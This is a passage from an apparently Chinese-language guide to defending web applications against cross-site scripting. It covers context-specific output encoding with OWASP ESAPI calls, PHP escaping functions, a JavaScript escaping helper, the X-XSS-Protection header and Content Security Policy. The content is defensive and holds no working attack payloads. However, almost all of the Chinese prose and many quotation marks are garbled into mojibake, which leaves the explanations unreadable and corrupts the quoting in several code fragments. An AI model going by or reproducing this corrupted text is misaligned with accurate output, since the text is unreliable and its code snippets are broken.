çš„å‡½æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨è¿™äº›å‡½æ•°å°±å¥½ï¼Œè€Œæœ‰äº›Webæ¡†æ¶ä¼¼ä¹æ›´â€œæ™ºèƒ½â€ï¼Œæ¯”å¦‚Railsï¼Œå®ƒèƒ½åœ¨é»˜è®¤æƒ…å†µä¸‹å¯¹æ‰€æœ‰æ’å…¥åˆ°HTMLé¡µé¢çš„æ•°æ®è¿›è¡ŒHTML Entityç¼–ç ï¼Œå°½ç®¡ä¸èƒ½å®Œå…¨é˜²å¾¡XSSï¼Œä½†ç€å®å‡è½»äº†å¼€å‘äººå‘˜çš„è´Ÿæ‹…ã€‚\n\u0026lt;body\u0026gt;â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œå¯¹å…¶è¿›è¡ŒHTML Entityç¼–ç â€¦\u0026lt;/body\u0026gt;\u0026lt;div\u0026gt;â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œå¯¹å…¶è¿›è¡ŒHTML Entityç¼–ç â€¦\u0026lt;/div\u0026gt;\u0026lt;p\u0026gt;â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œå¯¹å…¶è¿›è¡ŒHTML Entityç¼–ç â€¦\u0026lt;/p\u0026gt; ä»¥æ­¤ç±»æ¨ï¼Œå¾€å…¶ä»–HTMLæ ‡ç­¾ä¹‹é—´æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œå¯¹å…¶è¿›è¡ŒHTML Entityç¼–ç  [ç¼–ç è§„åˆ™] é‚£ä¹ˆHTML Entityç¼–ç å…·ä½“åº”è¯¥åšå“ªäº›äº‹æƒ…å‘¢ï¼Ÿå®ƒéœ€è¦å¯¹ä¸‹é¢è¿™6ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç ï¼š\n\u0026amp; â€“\u0026gt; \u0026amp;amp; \u0026lt; â€“\u0026gt; \u0026amp;lt; \u0026gt; â€“\u0026gt; \u0026amp;gt; â€ â€“\u0026gt; \u0026amp;quot; â€˜ â€“\u0026gt; \u0026amp;#x27; / â€“\u0026gt; \u0026amp;#x2f; æœ‰ä¸¤ç‚¹éœ€è¦ç‰¹åˆ«è¯´æ˜çš„æ˜¯:\n ä¸æ¨èå°†å•å¼•å·( â€˜ )ç¼–ç ä¸º ' å› ä¸ºå®ƒå¹¶ä¸æ˜¯æ ‡å‡†çš„HTMLæ ‡ç­¾ éœ€è¦å¯¹æ–œæ å·( / )ç¼–ç ï¼Œå› ä¸ºåœ¨è¿›è¡ŒXSSæ”»å‡»æ—¶ï¼Œæ–œæ å·å¯¹äºå…³é—­å½“å‰HTMLæ ‡ç­¾éå¸¸æœ‰ç”¨  æ¨èä½¿ç”¨OWASPæä¾›çš„ESAPIå‡½æ•°åº“ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—éå¸¸ä¸¥æ ¼çš„ç”¨äºè¿›è¡Œå„ç§å®‰å…¨ç¼–ç çš„å‡½æ•°ã€‚åœ¨å½“å‰è¿™ä¸ªä¾‹å­é‡Œï¼Œä½ å¯ä»¥ä½¿ç”¨:\nString encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter(â€œinputâ€)); è¿™æ¡åŸåˆ™æ˜¯æŒ‡ï¼Œå½“ä½ è¦å¾€HTMLå±æ€§ï¼ˆä¾‹å¦‚widthã€nameã€valueå±æ€§ï¼‰çš„å€¼éƒ¨åˆ†(data value)æ’å…¥ä¸å¯ä¿¡æ•°æ®çš„æ—¶å€™ï¼Œåº”è¯¥å¯¹æ•°æ®è¿›è¡ŒHTMLå±æ€§ç¼–ç ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“è¦å¾€HTMLæ ‡ç­¾çš„äº‹ä»¶å¤„ç†å±æ€§ï¼ˆä¾‹å¦‚onmouseoverï¼‰é‡Œæ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæœ¬æ¡åŸåˆ™ä¸é€‚ç”¨ï¼Œåº”è¯¥ç”¨ä¸‹é¢ä»‹ç»çš„åŸåˆ™4å¯¹å…¶è¿›è¡ŒJavaScriptç¼–ç ã€‚\n\u0026lt;div attr=â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒHTMLå±æ€§ç¼–ç â€¦\u0026gt;\u0026lt;/div\u0026gt;å±æ€§å€¼éƒ¨åˆ†æ²¡æœ‰ä½¿ç”¨å¼•å·ï¼Œä¸æ¨è \u0026lt;div attr=â€™â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒHTMLå±æ€§ç¼–ç â€¦â€™\u0026gt;\u0026lt;/div\u0026gt; å±æ€§å€¼éƒ¨åˆ†ä½¿ç”¨äº†å•å¼•å· \u0026lt;div attr=â€â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒHTMLå±æ€§ç¼–ç â€¦â€\u0026gt;\u0026lt;/div\u0026gt; å±æ€§å€¼éƒ¨åˆ†ä½¿ç”¨äº†åŒå¼•å· [ç¼–ç è§„åˆ™]\né™¤äº†ç©ºæ ¼ç¬¦å¯ä»¥é—­åˆå½“å‰å±æ€§å¤–ï¼Œè¿™äº›ç¬¦å·ä¹Ÿå¯ä»¥ï¼š\n% * + , â€“ / ; \u0026lt; = \u0026gt; ^ | `(åå•å¼•å·ï¼ŒIEä¼šè®¤ä¸ºå®ƒæ˜¯å•å¼•å·)\nå¯ä»¥ä½¿ç”¨ESAPIæä¾›çš„å‡½æ•°è¿›è¡ŒHTMLå±æ€§ç¼–ç ï¼š\nString encodedContent = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(â€œinputâ€)); åŸåˆ™4ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°SCRIPTé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒSCRIPTç¼–ç  è¿™æ¡åŸåˆ™ä¸»è¦é’ˆå¯¹åŠ¨æ€ç”Ÿæˆçš„JavaScriptä»£ç ï¼Œè¿™åŒ…æ‹¬è„šæœ¬éƒ¨åˆ†ä»¥åŠHTMLæ ‡ç­¾çš„äº‹ä»¶å¤„ç†å±æ€§ï¼ˆEvent Handlerï¼Œå¦‚onmouseover, onloadç­‰ï¼‰ã€‚åœ¨å¾€JavaScriptä»£ç é‡Œæ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œåªæœ‰ä¸€ç§æƒ…å†µæ˜¯å®‰å…¨çš„ï¼Œé‚£å°±æ˜¯å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡ŒJavaScriptç¼–ç ï¼Œå¹¶ä¸”åªæŠŠè¿™äº›æ•°æ®æ”¾åˆ°ä½¿ç”¨å¼•å·åŒ…å›´èµ·æ¥çš„å€¼éƒ¨åˆ†ï¼ˆdata valueï¼‰ä¹‹ä¸­ï¼Œä¾‹å¦‚ï¼š\n\u0026lt;script\u0026gt; var message = â€œ\u0026lt;%= encodeJavaScript(@INPUT) %\u0026gt;â€; \u0026lt;/script\u0026gt; é™¤æ­¤ä¹‹å¤–ï¼Œå¾€JavaScriptä»£ç é‡Œå…¶ä»–ä»»ä½•åœ°æ–¹æ’å…¥ä¸å¯ä¿¡æ•°æ®éƒ½æ˜¯ç›¸å½“å±é™©çš„ï¼Œæ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°æ’å…¥æ”»å‡»ä»£ç ã€‚\n\u0026lt;script\u0026gt;alert(â€˜â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒJavaScriptç¼–ç â€¦â€™)\u0026lt;/script\u0026gt;å€¼éƒ¨åˆ†ä½¿ç”¨äº†å•å¼•å· \u0026lt;script\u0026gt;x = â€œâ€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒJavaScriptç¼–ç â€¦â€\u0026lt;/script\u0026gt; å€¼éƒ¨åˆ†ä½¿ç”¨äº†åŒå¼•å· \u0026lt;div onmouseover=â€x=â€™â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒJavaScriptç¼–ç â€¦â€™ â€œ\u0026lt;/div\u0026gt; å€¼éƒ¨åˆ†ä½¿ç”¨äº†å¼•å·ï¼Œä¸”äº‹ä»¶å¤„ç†å±æ€§çš„å€¼éƒ¨åˆ†ä¹Ÿä½¿ç”¨äº†å¼•å· ç‰¹åˆ«éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨XSSé˜²å¾¡ä¸­ï¼Œæœ‰äº›JavaScriptå‡½æ•°æ˜¯æåº¦å±é™©çš„ï¼Œå°±ç®—å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡ŒJavaScriptç¼–ç ï¼Œä¹Ÿä¾ç„¶ä¼šäº§ç”ŸXSSæ¼æ´ï¼Œä¾‹å¦‚ï¼š \u0026lt;script\u0026gt; window.setInterval(â€˜â€¦å°±ç®—å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡Œäº†JavaScriptç¼–ç ï¼Œè¿™é‡Œä¾ç„¶ä¼šæœ‰XSSæ¼æ´â€¦â€™); \u0026lt;/script\u0026gt; [ç¼–ç è§„åˆ™]\né™¤äº†é˜¿æ‹‰ä¼¯æ•°å­—å’Œå­—æ¯ï¼Œå¯¹å…¶ä»–æ‰€æœ‰çš„å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œåªè¦è¯¥å­—ç¬¦çš„ASCIIç å°äº256ã€‚ç¼–ç åè¾“å‡ºçš„æ ¼å¼ä¸º \\xHH ï¼ˆä»¥ \\x å¼€å¤´ï¼ŒHHåˆ™æ˜¯æŒ‡è¯¥å­—ç¬¦å¯¹åº”çš„åå…­è¿›åˆ¶æ•°å­—ï¼‰\nåœ¨å¯¹ä¸å¯ä¿¡æ•°æ®åšç¼–ç çš„æ—¶å€™ï¼Œåƒä¸‡ä¸èƒ½å›¾æ–¹ä¾¿ä½¿ç”¨åæ–œæ ï¼ˆ \\ ï¼‰å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç®€å•è½¬ä¹‰ï¼Œæ¯”å¦‚å°†åŒå¼•å· â€ è½¬ä¹‰æˆ \\â€ ï¼Œè¿™æ ·åšæ˜¯ä¸å¯é çš„ï¼Œå› ä¸ºæµè§ˆå™¨åœ¨å¯¹é¡µé¢åšè§£æçš„æ—¶å€™ï¼Œä¼šå…ˆè¿›è¡ŒHTMLè§£æï¼Œç„¶åæ‰æ˜¯JavaScriptè§£æï¼Œæ‰€ä»¥åŒå¼•å·å¾ˆå¯èƒ½ä¼šè¢«å½“åšHTMLå­—ç¬¦è¿›è¡ŒHTMLè§£æï¼Œè¿™æ—¶åŒå¼•å·å°±å¯ä»¥çªç ´ä»£ç çš„å€¼éƒ¨åˆ†ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥ç»§ç»­è¿›è¡ŒXSSæ”»å‡»ã€‚\nå¯ä»¥ä½¿ç”¨ESAPIæä¾›çš„å‡½æ•°è¿›è¡ŒJavaScriptç¼–ç ï¼š\nString encodedContent = ESAPI.encoder().encodeForJavaScript(request.getParameter(â€œinputâ€)); åŸåˆ™5ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°Styleå±æ€§é‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç  å½“éœ€è¦å¾€Stylesheetï¼ŒStyleæ ‡ç­¾æˆ–è€…Styleå±æ€§é‡Œæ’å…¥ä¸å¯ä¿¡æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦å¯¹è¿™äº›æ•°æ®è¿›è¡ŒCSSç¼–ç ã€‚ä¼ ç»Ÿå°è±¡é‡ŒCSSä¸è¿‡æ˜¯è´Ÿè´£é¡µé¢æ ·å¼çš„ï¼Œä½†æ˜¯å®é™…ä¸Šå®ƒæ¯”æˆ‘ä»¬æƒ³è±¡çš„è¦å¼ºå¤§è®¸å¤šï¼Œè€Œä¸”è¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œå„ç§æ”»å‡»ã€‚å› æ­¤ï¼Œä¸è¦å¯¹CSSé‡Œå­˜æ”¾ä¸å¯ä¿¡æ•°æ®æ‰ä»¥è½»å¿ƒï¼Œåº”è¯¥åªå…è®¸æŠŠä¸å¯ä¿¡æ•°æ®æ”¾å…¥åˆ°CSSå±æ€§çš„å€¼éƒ¨åˆ†ï¼Œå¹¶è¿›è¡Œé€‚å½“çš„ç¼–ç ã€‚é™¤æ­¤ä»¥å¤–ï¼Œæœ€å¥½ä¸è¦æŠŠä¸å¯ä¿¡æ•°æ®æ”¾åˆ°ä¸€äº›å¤æ‚å±æ€§é‡Œï¼Œæ¯”å¦‚url, behaviorç­‰ï¼Œåªèƒ½è¢«IEè®¤è¯†çš„Expressionå±æ€§å…è®¸æ‰§è¡ŒJavaScriptè„šæœ¬ï¼Œå› æ­¤ä¹Ÿä¸æ¨èæŠŠä¸å¯ä¿¡æ•°æ®æ”¾åˆ°è¿™é‡Œã€‚\n\u0026lt;style\u0026gt;selector { property : â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒCSSç¼–ç â€¦} \u0026lt;/style\u0026gt;\u0026lt;style\u0026gt;selector { property : â€ â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒCSSç¼–ç â€¦ â€œ} \u0026lt;/style\u0026gt; \u0026lt;span style=â€ property : â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒCSSç¼–ç â€¦ â€\u0026gt; â€¦ \u0026lt;/span\u0026gt; [ç¼–ç è§„åˆ™]\né™¤äº†é˜¿æ‹‰ä¼¯æ•°å­—å’Œå­—æ¯ï¼Œå¯¹å…¶ä»–æ‰€æœ‰çš„å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œåªè¦è¯¥å­—ç¬¦çš„ASCIIç å°äº256ã€‚ç¼–ç åè¾“å‡ºçš„æ ¼å¼ä¸º \\HH ï¼ˆä»¥ \\ å¼€å¤´ï¼ŒHHåˆ™æ˜¯æŒ‡è¯¥å­—ç¬¦å¯¹åº”çš„åå…­è¿›åˆ¶æ•°å­—ï¼‰\nåŒåŸåˆ™2ï¼ŒåŸåˆ™3ï¼Œåœ¨å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡Œç¼–ç çš„æ—¶å€™ï¼Œåˆ‡å¿ŒæŠ•æœºå–å·§å¯¹åŒå¼•å·ç­‰ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç®€å•è½¬ä¹‰ï¼Œæ”»å‡»è€…å¯ä»¥æƒ³åŠæ³•ç»•å¼€è¿™ç±»é™åˆ¶ã€‚\nå¯ä»¥ä½¿ç”¨ESAPIæä¾›çš„å‡½æ•°è¿›è¡ŒCSSç¼–ç ï¼š\nString encodedContent = ESAPI.encoder().encodeForCSS(request.getParameter(â€œinputâ€)); åŸåˆ™6ï¼šåœ¨å°†ä¸å¯ä¿¡æ•°æ®æ’å…¥åˆ°HTML URLé‡Œæ—¶ï¼Œå¯¹è¿™äº›æ•°æ®è¿›è¡ŒURLç¼–ç  å½“éœ€è¦å¾€HTMLé¡µé¢ä¸­çš„URLé‡Œæ’å…¥ä¸å¯ä¿¡æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦å¯¹å…¶è¿›è¡ŒURLç¼–ç ï¼Œå¦‚ä¸‹ï¼š\n\u0026lt;a href=â€http://www.abcd.com?param=â€¦æ’å…¥ä¸å¯ä¿¡æ•°æ®å‰ï¼Œè¿›è¡ŒURLç¼–ç â€¦â€\u0026gt; Link Content \u0026lt;/a\u0026gt; [ç¼–ç è§„åˆ™]\né™¤äº†é˜¿æ‹‰ä¼¯æ•°å­—å’Œå­—æ¯ï¼Œå¯¹å…¶ä»–æ‰€æœ‰çš„å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œåªè¦è¯¥å­—ç¬¦çš„ASCIIç å°äº256ã€‚ç¼–ç åè¾“å‡ºçš„æ ¼å¼ä¸º %HH ï¼ˆä»¥ % å¼€å¤´ï¼ŒHHåˆ™æ˜¯æŒ‡è¯¥å­—ç¬¦å¯¹åº”çš„åå…­è¿›åˆ¶æ•°å­—ï¼‰\nåœ¨å¯¹URLè¿›è¡Œç¼–ç çš„æ—¶å€™ï¼Œæœ‰ä¸¤ç‚¹æ˜¯éœ€è¦ç‰¹åˆ«æ³¨æ„çš„ï¼š\n URLå±æ€§åº”è¯¥ä½¿ç”¨å¼•å·å°†å€¼éƒ¨åˆ†åŒ…å›´èµ·æ¥ï¼Œå¦åˆ™æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“çªç ´å½“å‰å±æ€§åŒºåŸŸï¼Œæ’å…¥åç»­æ”»å‡»ä»£ç  ä¸è¦å¯¹æ•´ä¸ªURLè¿›è¡Œç¼–ç ï¼Œå› ä¸ºä¸å¯ä¿¡æ•°æ®å¯èƒ½ä¼šè¢«æ’å…¥åˆ°href, srcæˆ–è€…å…¶ä»–ä»¥URLä¸ºåŸºç¡€çš„å±æ€§é‡Œï¼Œè¿™æ—¶éœ€è¦å¯¹æ•°æ®çš„èµ·å§‹éƒ¨åˆ†çš„åè®®å­—æ®µè¿›è¡ŒéªŒè¯ï¼Œå¦åˆ™æ”»å‡»è€…å¯ä»¥æ”¹å˜URLçš„åè®®ï¼Œä¾‹å¦‚ä»HTTPåè®®æ”¹ä¸ºDATAä¼ªåè®®ï¼Œæˆ–è€…javascriptä¼ªåè®®ã€‚  å¯ä»¥ä½¿ç”¨ESAPIæä¾›çš„å‡½æ•°è¿›è¡ŒURLç¼–ç ï¼š\nString encodedContent = ESAPI.encoder().encodeForURL(request.getParameter(â€œinputâ€)); ESAPIè¿˜æä¾›äº†ä¸€äº›ç”¨äºæ£€æµ‹ä¸å¯ä¿¡æ•°æ®çš„å‡½æ•°ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶æ¥æ£€æµ‹ä¸å¯ä¿¡æ•°æ®æ˜¯å¦çœŸçš„æ˜¯ä¸€ä¸ªURLï¼š\nString userProvidedURL = request.getParameter(â€œuserProvidedURLâ€);boolean isValidURL = ESAPI.validator().isValidInput(â€œURLContextâ€, userProvidedURL, â€œURLâ€, 255, false); if (isValidURL) { \u0026lt;a href=â€\u0026lt;%= encoder.encodeForHTMLAttribute(userProvidedURL) %\u0026gt;â€\u0026gt;\u0026lt;/a\u0026gt; } åŸåˆ™7ï¼šä½¿ç”¨å¯Œæ–‡æœ¬æ—¶ï¼Œä½¿ç”¨XSSè§„åˆ™å¼•æ“è¿›è¡Œç¼–ç è¿‡æ»¤ Webåº”ç”¨ä¸€èˆ¬éƒ½ä¼šæä¾›ç”¨æˆ·è¾“å…¥å¯Œæ–‡æœ¬ä¿¡æ¯çš„åŠŸèƒ½ï¼Œæ¯”å¦‚BBSå‘å¸–ï¼Œå†™åšå®¢æ–‡ç« ç­‰ï¼Œç”¨æˆ·æäº¤çš„å¯Œæ–‡æœ¬ä¿¡æ¯é‡Œå¾€å¾€åŒ…å«äº†HTMLæ ‡ç­¾ï¼Œç”šè‡³æ˜¯JavaScriptè„šæœ¬ï¼Œå¦‚æœä¸å¯¹å…¶è¿›è¡Œé€‚å½“çš„ç¼–ç è¿‡æ»¤çš„è¯ï¼Œåˆ™ä¼šå½¢æˆXSSæ¼æ´ã€‚ä½†æˆ‘ä»¬åˆä¸èƒ½å› ä¸ºå®³æ€•äº§ç”ŸXSSæ¼æ´ï¼Œæ‰€ä»¥å°±ä¸å…è®¸ç”¨æˆ·è¾“å…¥å¯Œæ–‡æœ¬ï¼Œè¿™æ ·å¯¹ç”¨æˆ·ä½“éªŒä¼¤å®³å¾ˆå¤§ã€‚\né’ˆå¯¹å¯Œæ–‡æœ¬çš„ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨XSSè§„åˆ™å¼•æ“å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œç¼–ç è¿‡æ»¤ï¼Œåªå…è®¸ç”¨æˆ·è¾“å…¥å®‰å…¨çš„HTMLæ ‡ç­¾ï¼Œå¦‚\u0026lt;b\u0026gt;, \u0026lt;i\u0026gt;, \u0026lt;p\u0026gt;ç­‰ï¼Œå¯¹å…¶ä»–æ•°æ®è¿›è¡ŒHTMLç¼–ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»è¿‡è§„åˆ™å¼•æ“ç¼–ç è¿‡æ»¤åçš„å†…å®¹åªèƒ½æ”¾åœ¨\u0026lt;div\u0026gt;, \u0026lt;p\u0026gt;ç­‰å®‰å…¨çš„HTMLæ ‡ç­¾é‡Œï¼Œä¸è¦æ”¾åˆ°HTMLæ ‡ç­¾çš„å±æ€§å€¼é‡Œï¼Œæ›´ä¸è¦æ”¾åˆ°HTMLäº‹ä»¶å¤„ç†å±æ€§é‡Œï¼Œæˆ–è€…æ”¾åˆ°\u0026lt;SCRIPT\u0026gt;æ ‡ç­¾é‡Œã€‚\næ¨èXSSè§„åˆ™è¿‡æ»¤å¼•æ“ï¼šOWASP AntiSampæˆ–è€…Java HTML Sanitizer\nSummary  å½“è¾“å‡ºç‚¹å‡ºç°åœ¨HTMLæ ‡ç­¾å±æ€§ï¼š   \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026amp; -\u0026gt; \u0026amp;amp; \u0026quot; -\u0026gt; \u0026amp;quot; ' -\u0026gt; \u0026amp;#39  å½“è¾“å‡ºç‚¹å‡ºç°åœ¨\u0026lt;script\u0026gt;æ ‡ç­¾ä¸­ã€‚è¿™ç§æƒ…å†µç›¸å½“å±é™©ï¼Œä¸éœ€è¦è€ƒè™‘xssè§¦å‘ï¼Œåªéœ€è¦è€ƒè™‘ç¼–å†™jså³å¯   ' -\u0026gt; \\'; \u0026quot; -\u0026gt; \\\u0026quot;; \\ -\u0026gt; \\\\; / -\u0026gt; \\/; (æ¢è¡Œç¬¦) -\u0026gt; \\n; (å›è½¦ç¬¦) -\u0026gt; \\r;  å½“è¾“å‡ºç‚¹å‡ºç°åœ¨bodyä¸­   \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026amp; -\u0026gt; \u0026amp;amp; \u0026quot; -\u0026gt; \u0026amp;quot; ' -\u0026gt; \u0026amp;#39  å½“è¾“å‡ºç‚¹å‡ºç°åœ¨jsäº‹ä»¶ä¸­(onClick=\u0026ldquo;ä½ çš„ä»£ç \u0026rdquo;)   \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026amp; -\u0026gt; \u0026amp;amp; \u0026quot; -\u0026gt; \u0026amp;quot; ' -\u0026gt; \u0026amp;#39 \\ -\u0026gt; \\\\; / -\u0026gt; \\/; (æ¢è¡Œç¬¦) -\u0026gt; \\n; (å›è½¦ç¬¦) -\u0026gt; \\r;  è¾“å‡ºåœ¨URLå±æ€§ä¸­\u0026lt;script src=\u0026quot;ä½ çš„ä»£ç \u0026quot;\u0026gt;  URLç¼–ç     Escape htmlspecialchars - php  htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(\u0026#34;default_charset\u0026#34;) [, bool $double_encode = TRUE ]]] ) : string å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“\nstring\tå¾…è½¬æ¢çš„ stringã€‚\nflags\tä½æ©ç ï¼Œç”±ä»¥ä¸‹æŸä¸ªæˆ–å¤šä¸ªæ ‡è®°ç»„æˆï¼Œè®¾ç½®è½¬ä¹‰å¤„ç†ç»†èŠ‚ã€æ— æ•ˆå•å…ƒåºåˆ—ã€æ–‡æ¡£ç±»å‹ã€‚ é»˜è®¤æ˜¯ ENT_COMPAT | ENT_HTML401ã€‚\ndouble_encode\tå…³é—­ double_encode æ—¶ï¼ŒPHP ä¸ä¼šè½¬æ¢ç°æœ‰çš„ HTML å®ä½“ï¼Œ é»˜è®¤æ˜¯å…¨éƒ¨è½¬æ¢ã€‚\nencoding\tAn optional argument defining the encoding used when converting characters.\n    å­—ç¬¦ æ›¿æ¢å     \u0026amp; (\u0026amp; ç¬¦å·) \u0026amp;amp;   \u0026quot; (åŒå¼•å·) \u0026amp;quotï¼Œé™¤éè®¾ç½®äº† ENT_NOQUOTES   ' (å•å¼•å·) è®¾ç½®äº† ENT_QUOTES åï¼Œ \u0026amp;#039; (å¦‚æœæ˜¯ ENT_HTML401) ï¼Œæˆ–è€… \u0026amp;apos; (å¦‚æœæ˜¯ ENT_XML1ã€ ENT_XHTMLæˆ– ENT_HTML5)ã€‚   \u0026lt; (å°äº) \u0026amp;lt;   \u0026gt; (å¤§äº) \u0026amp;gt;    htmlentities - php  â€‹\tæœ¬å‡½æ•°å„æ–¹é¢éƒ½å’Œ htmlspecialchars() ä¸€æ ·ï¼Œ é™¤äº† htmlentities() ä¼šè½¬æ¢æ‰€æœ‰å…·æœ‰ HTML å®ä½“çš„å­—ç¬¦ã€‚\n Front end å‰ç«¯è¿‡æ»¤\nfunction xssCheck(str,reg){ return str ? str.replace(reg || /[\u0026amp;\u0026lt;\u0026#34;\u0026gt;\u0026#39;](?:(amp|lt|quot|gt|#39|nbsp|#\\d+);)?/g, function (a, b) { if(b){ return a; }else{ return { \u0026#39;\u0026lt;\u0026#39;:\u0026#39;\u0026amp;lt;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;:\u0026#39;\u0026amp;amp;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;:\u0026#39;\u0026amp;quot;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;:\u0026#39;\u0026amp;gt;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;:\u0026#39;\u0026amp;#39;\u0026#39;, }[a] } }) : \u0026#39;\u0026#39;; } HTTP Header X-XSS-Protection å¯ä»¥é€šè¿‡ http å¤´æ§åˆ¶æ˜¯å¦æ‰“å¼€ xss-filterï¼Œé»˜è®¤ä¸ºå¼€å¯ã€‚\né€šå¸¸æƒ…å†µä¸‹, åœ¨http headerä¸­åŠ å…¥ä»¥ä¸‹å­—æ®µè¡¨ç¤ºå¯ç”¨ xss-filterã€‚é™¤äº† Firefox ï¼Œè¿ IE 8 ä»¥ä¸Šå‡æ”¯æŒ X-XSS-Protection\nX-XSS-Protection: 0 X-XSS-Protection: 1 X-XSS-Protection: 1; mode=block X-XSS-Protection: 1; report=\u0026lt;reporting-uri\u0026gt;   0\nç¦æ­¢XSSè¿‡æ»¤ã€‚\n  1\nå¯ç”¨XSSè¿‡æ»¤ï¼ˆé€šå¸¸æµè§ˆå™¨æ˜¯é»˜è®¤çš„ï¼‰ã€‚ å¦‚æœæ£€æµ‹åˆ°è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæµè§ˆå™¨å°†æ¸…é™¤é¡µé¢ï¼ˆåˆ é™¤ä¸å®‰å…¨çš„éƒ¨åˆ†ï¼‰ã€‚\n  1;mode=block\nå¯ç”¨XSSè¿‡æ»¤ã€‚ å¦‚æœæ£€æµ‹åˆ°æ”»å‡»ï¼Œæµè§ˆå™¨å°†ä¸ä¼šæ¸…é™¤é¡µé¢ï¼Œè€Œæ˜¯é˜»æ­¢é¡µé¢åŠ è½½ã€‚\n  1; report= (Chromium only)\nå¯ç”¨XSSè¿‡æ»¤ã€‚ å¦‚æœæ£€æµ‹åˆ°è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæµè§ˆå™¨å°†æ¸…é™¤é¡µé¢å¹¶ä½¿ç”¨CSP report-uriæŒ‡ä»¤çš„åŠŸèƒ½å‘é€è¿è§„æŠ¥å‘Šã€‚\n  å¦‚ä¸Š, ç°ä»£æµè§ˆå™¨éƒ½å¯¹åå°„å‹ xss æœ‰ä¸€å®šçš„é˜²å¾¡åŠ›ï¼Œå…¶åŸç†æ˜¯æ£€æŸ¥ url å’Œ dom ä¸­å…ƒç´ çš„ç›¸å…³æ€§ï¼Œä½†è¿™å¹¶ä¸èƒ½å®Œå…¨é˜²æ­¢åå°„å‹ xss\nå¦å¤–, æµè§ˆå™¨å¯¹äºå­˜å‚¨å‹ xss å¹¶æ²¡æœ‰æŠµæŠ—åŠ›, åŸå› å¾ˆç®€å•, ç”¨æˆ·çš„éœ€æ±‚æ˜¯å¤šç§å¤šæ ·çš„. æ‰€ä»¥, æŠµå¾¡xssè¿™ä»¶äº‹æƒ…ä¸èƒ½æŒ‡æœ›æµè§ˆå™¨ã€‚\nContent Security Policy è¿˜æœ‰å°±æ˜¯æˆ‘ä»¬ä¹‹å‰ä»‹ç»çš„ CSP ç­–ç•¥äº†ã€‚\nä¸ºäº†ç¼“è§£å¾ˆå¤§ä¸€éƒ¨åˆ†æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼Œæµè§ˆå™¨çš„æ‰©å±•ç¨‹åºç³»ç»Ÿå¼•å…¥äº† CSPã€‚CSP ç®¡ç†ç½‘ç«™å…è®¸åŠ è½½çš„å†…å®¹, å¹¶ä¸”ä½¿ç”¨ç™½åå•çš„æœºåˆ¶å¯¹ç½‘ç«™åŠ è½½æˆ–æ‰§è¡Œçš„èµ„æºèµ·ä½œç”¨ã€‚åœ¨ç½‘é¡µä¸­, è¿™æ ·çš„ç­–ç•¥é€šè¿‡ HTTP 